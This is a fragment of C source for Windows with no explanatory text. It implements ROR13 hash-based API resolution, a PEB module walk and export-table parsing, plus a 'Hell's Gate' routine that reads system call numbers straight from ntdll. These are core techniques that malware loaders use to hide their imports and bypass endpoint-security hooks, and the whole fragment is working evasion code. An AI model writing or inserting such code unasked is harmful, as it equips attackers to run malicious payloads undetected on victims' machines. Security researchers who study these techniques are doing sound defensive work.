DWORD ror13(const char *str) { DWORD h = 0; while (*str) { h = (h >> 13) | (h << 19); h += *str++; } return h; }
DWORD get_hash_from_unicode(UNICODE_STRING *str) { DWORD h = 0; for(int i=0; i < str->Length / 2; i++) { char c = str->Buffer[i]; if (c >= 'a' && c <= 'z') c -= 0x20; h = (h >> 13) | (h << 19); h += c; } return h; }

HMODULE get_module_by_hash(DWORD hash) {
    PEB *peb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA *ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *curr = head->Flink;
    while(curr != head) {
        LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (get_hash_from_unicode(&entry->BaseDllName) == hash) return (HMODULE)entry->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}

FARPROC get_func_by_hash(HMODULE mod, DWORD hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((char*)mod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((char*)mod + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    DWORD *names = (DWORD*)((char*)mod + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((char*)mod + exp->AddressOfFunctions);
    WORD *ords = (WORD*)((char*)mod + exp->AddressOfNameOrdinals);
    for(DWORD i=0; i < exp->NumberOfNames; i++) {
        char *name = (char*)mod + names[i];
        if (ror13(name) == hash) return (FARPROC)((char*)mod + funcs[ords[i]]);
    }
    return NULL;
}

DWORD GetSSN(HMODULE hNtdll, DWORD hash) {
    FARPROC addr = get_func_by_hash(hNtdll, hash);
    if (!addr) return -1;
    // Hell's Gate: 4C 8B D1 B8 <SSN> 00 00
    // Check for MOV R10, RCX (4C 8B D1) and MOV EAX, SSN (B8 ...)
    BYTE *p = (BYTE*)addr;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(DWORD*)(p + 4);
    }
    return -1;
}

